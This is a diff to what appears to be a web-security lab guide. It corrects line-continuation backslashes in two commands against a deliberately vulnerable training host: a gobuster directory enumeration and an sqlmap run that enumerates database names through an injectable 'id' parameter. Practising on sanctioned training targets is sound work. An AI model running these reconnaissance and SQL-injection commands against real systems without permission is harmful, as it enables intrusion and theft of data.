@@ -36,8 +36,8 @@ These commands send requests to the deliberately vulnerable training host. Use t
 ### Gobuster directory enumeration
 
 ```bash
-gobuster dir -u http://testasp.vulnweb.com/ \\
-  -w /usr/share/wordlists/dirb/common.txt \\
+gobuster dir -u http://testasp.vulnweb.com/ \
+  -w /usr/share/wordlists/dirb/common.txt \
   -t 5 -x asp,txt,bak
 ```
 
@@ -46,7 +46,7 @@ The captured run completed 18,452 entries. Review status codes and returned cont
 ### SQLMap database-name enumeration
 
 ```bash
-sqlmap -u 'http://testasp.vulnweb.com/showforum.asp?id=0' \\
+sqlmap -u 'http://testasp.vulnweb.com/showforum.asp?id=0' \
   --dbs --batch --threads=1
 ```
 
